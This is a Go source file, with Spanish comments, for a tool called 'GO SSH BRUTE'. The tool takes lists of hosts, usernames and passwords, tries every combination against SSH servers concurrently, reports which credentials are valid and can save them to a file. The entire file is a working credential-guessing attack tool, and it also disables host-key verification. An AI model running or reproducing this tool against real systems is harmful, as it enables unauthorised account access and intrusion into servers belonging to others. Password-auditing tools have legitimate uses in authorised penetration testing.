/* Simple SSH Bruteforcing Tool*/

package main

import (
    "bufio"
    "flag"
    "fmt"
    "golang.org/x/crypto/ssh"
    "log"
    "net"
    "os"
    "strconv"
    "sync"
    "time"
)

/* Flags Globales*/
var (
    host      = flag.String("l", "", "Host in format IP:Port")
    list_host = flag.String("L", "", "List of host in format IP:Port, one per line")
    user      = flag.String("u", "", "Username")
    list_user = flag.String("U", "", "List of users, one per line")
    pass      = flag.String("p", "", "Password")
    list_pwd  = flag.String("P", "", "List of passwords, one per line")
    tmout     = flag.Duration("t", 300*time.Millisecond, "SSH Dial Timeout")
    out       = flag.String("o", "", "Output file")
)

type Status string

const (
    Closed  Status = "Port closed"
    Valid   Status = "Valid credentials"
    Invalid Status = "Invalid credentials"
    Init    Status = "Initialized"
)

type host_data struct {
    ip     string
    port   string
    user   string
    pwd    string
    status Status
}

var ssh_input []host_data
var ssh_output []host_data
var ch = make(chan host_data)

func main() {
    /* Banner && Version */
    banner()

    /* Arguments parsing */
    flag.Parse()
    if *list_user == "" && *list_pwd == "" && *list_host == "" && *user == "" && *pass == "" && *host == "" {
        //flag.PrintDefaults()
        usage()
    }

    /* Timestamp */
    timestamp()

    /* Exec mode: Multi or Single */
    if *list_host != "" && *list_user != "" && *list_pwd != "" {
        multiCall(*list_host, *list_user, *list_pwd)
    } else if *host != "" && *user != "" && *pass != "" {
        singleCall(*host, *user, *pass)
    } else {
        fmt.Printf("\nERROR - You can not mix lists and singles inputs\n")
        os.Exit(1)
    }
}

func timestamp() {
    fmt.Printf("Date: %s", time.Now().Format("02.01.2006 15:04:05\n"))
}

func banner() {
    fmt.Printf("##########################################\n")
    fmt.Printf("######### GO SSH BRUTE -- v0.0.4 #########\n")
    fmt.Printf("##########################################\n")
}

func usage() {
    fmt.Printf("\nERROR - Must complete all input params\n")
    fmt.Printf("\nUsage mode:\n")
    fmt.Printf("Single Mode --> %s -L <host-list> -U <user-list> -P <pass-list>\n", os.Args[0])
    fmt.Printf("Multi Mode --> %s -l <host> -u <user> -p <pass>\n", os.Args[0])
    fmt.Printf("Note: options -t <500ms> and -o <out-file> are optional\n")
    os.Exit(1)
}

func ip_port_checker(ip, port string) (result bool) {
    result = false
    ip_parsed := net.ParseIP(ip)
    port_parsed, _ := strconv.Atoi(port)
    if ip_parsed == nil && (port_parsed <= 0 || port_parsed >= 65535) {
        fmt.Printf("\nERROR - Bad IP:Port Format -- %s:%s\n", ip, port)
    } else if ip_parsed == nil {
        fmt.Printf("\nERROR - Bad IP Format -- %s\n", ip)
    } else if port_parsed <= 0 || port_parsed >= 65535 {
        fmt.Printf("\nERROR - Bad Port Format -- %s\n", port)
    } else {
        result = true
    }
    return
}

func singleCall(host, user, pass string) {
    ssh_output = make([]host_data, 1)
    /* Direccion IP y puerto del host */
    ip, port, _ := net.SplitHostPort(host)
    if len(ip) == 0 || len(port) == 0 {
        fmt.Printf("\nERROR - IP or port can not be empty -- %s:%s\n", ip, port)
        os.Exit(1)
    }
    /* Elemento resultado */
    var elem host_data
    /* Preparamos la espera para la gorutina */
    wg := &sync.WaitGroup{}
    wg.Add(1)
    /* Comprobamos los parametros */
    result := ip_port_checker(ip, port)
    if result == false {
        os.Exit(1)
    } else {
        /* Si todo es correcto ejecutamos la conexión */
        wg.Add(1)
        go sshConn(wg, ip, port, user, pass)
    }
    /* Recogemos el retorno de la gorutina */
    elem = <-ch
    ssh_output[0] = elem
    /* Cerramos el canal la gorutina */
    close(ch)
    wg.Done()
    /* Si se ha indicado un fichero de salida */
    if *out != "" {
        writeOutFile(ssh_output)
    } else {
        //fmt.Printf("%+v\n", elem)
    }
}

func multiCall(list_host, list_user, list_pwd string) {
    /* Leemos la lista de hosts */
    hosts, err := readList(list_host)
    if err != nil {
        log.Fatal("Can not read hosts file")
    }

    /* Leemos la lista de usuarios */
    users, err := readList(list_user)
    if err != nil {
        log.Fatal("Can not read users file")
    }

    /* Leemos la lista de contraseñas */
    pwds, err := readList(list_pwd)
    if err != nil {
        log.Fatal("Can not read passwords file")
    }

    /* Creamos una lista con las posibles combinaciones */
    var elem host_data
    for h := range hosts {
        for u := range users {
            for p := range pwds {
                //var elem host_data
                /* Direccion IP y puerto del host */
                ip, port, _ := net.SplitHostPort(hosts[h])
                if len(ip) == 0 || len(port) == 0 {
                    fmt.Printf("\nERROR - IP or port can not be empty -- %s:%s\n")
                    os.Exit(1)
                }
                /* Construimos el elemento */
                elem.ip = ip
                elem.port = port
                elem.user = users[u]
                elem.pwd = pwds[p]
                elem.status = Init
                //fmt.Printf("%+v\n", elem)
                ssh_input = append(ssh_input, elem)
            }
        }
    }

    /* Creamos la espera para cada gorutina */
    wg := &sync.WaitGroup{}
    /* Recorremos la lista de elementos*/
    for i := range ssh_input {
        /* Leemos cada elemento */
        user := ssh_input[i].user
        pwd := ssh_input[i].pwd
        ip := ssh_input[i].ip
        port := ssh_input[i].port
        //status := ssh_input[i].status
        /* Comprobamos los parametros */
        result := ip_port_checker(ip, port)
        if result == false {
            os.Exit(1)
        } else {
            /* Si todo es correcto ejecutamos la conexión */
            wg.Add(1)
            go sshConn(wg, ip, port, user, pwd)
        }
    }
    /* Esperamos la respuesta de las conexiones */
    ssh_output := make([]host_data, len(ssh_input))
    for i := range ssh_output {
        elem := <-ch
        ssh_output[i] = elem
    }

    /* Dormimos el programa principal hasta que
       acabe el proceso */
    close(ch)
    wg.Wait()
    if *out != "" {
        writeOutFile(ssh_output)
    } else {
        for i := range ssh_output {
            if ssh_output[i].status == Valid {
                //  fmt.Printf("%+v\n", ssh_output[i])
            }
        }
    }
}

func writeOutFile(ssh_output []host_data) {
    f, err := os.Create(*out)
    if err != nil {
        fmt.Println(err)
        os.Exit(1)
    }
    defer f.Close()

    for i := range ssh_output {
        _, err := f.WriteString("Host: " + ssh_output[i].ip + "\tPort: " + ssh_output[i].port + "\tUser: " + ssh_output[i].user + "\tPassword: " + ssh_output[i].pwd + "\tStatus: " + string(ssh_output[i].status) + "\n")
        if err != nil {
            fmt.Println(err)
            os.Exit(1)
        }
    }
}

func readList(list string) (lst []string, err error) {
    /* Abrimos la lista indicada */
    file, err := os.Open(list)
    if err != nil {
        return
    }
    defer file.Close()
    /* Leemos cada entrada de la lista */
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lst = append(lst, scanner.Text())
    }
    return
}

func sshIsUp(ip, port string) (isUp bool, addr string) {
    isUp = false
    /* Comprobamos si el servicio esta escuchando */
    addr = net.JoinHostPort(ip, port)
    _, err := net.DialTimeout("tcp", addr, *tmout)
    var elem_out host_data
    elem_out.ip = ip
    elem_out.port = port
    /* Si el puerto está cerrado */
    if err != nil {
        fmt.Printf("\n\033[1;91mFAILED --> Port %s/tcp is closed on %s\033[0m\n", port, ip)
        elem_out.status = Closed
        ch <- elem_out
    } else {
        /* Si el servicio en el puerto indicado esta a la escucha */
        isUp = true
    }
    return
}

func sshConn(wg *sync.WaitGroup, ip, port, user, pwd string) {
    defer wg.Done()
    /* Comprobamos que el puerto esta a la escucha */
    isUp, addr := sshIsUp(ip, port)
    if isUp == true {
        /* SSH Client Config */
        config := &ssh.ClientConfig{
            User:            user,
            /* G106 (CWE-322): Use of ssh InsecureIgnoreHostKey should be audited 
                (Confidence: HIGH, Severity: MEDIUM) */
            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
            Auth:            []ssh.AuthMethod{ssh.Password(pwd)},
            Timeout:         *tmout,
        }
        /* Configuramos los valores que no se hayan cumplimentado */
        config.SetDefaults()
        /* SSH Connection */
        _, err := ssh.Dial("tcp", addr, config)
        var elem_out host_data
        elem_out.ip = ip
        elem_out.port = port
        elem_out.user = user
        elem_out.pwd = pwd
        if err != nil {
            fmt.Printf("\n\033[1;91mFAILED --> host: %s   login: %s   password: %s\033[0m\n", addr, user, pwd)
            elem_out.status = Invalid
            ch <- elem_out
        } else {
            fmt.Printf("\n\033[1;92mSUCCESS --> host: %s   login: %s   password: %s\033[0m\n", addr, user, pwd)
            elem_out.status = Valid
            ch <- elem_out
        }
    }
}
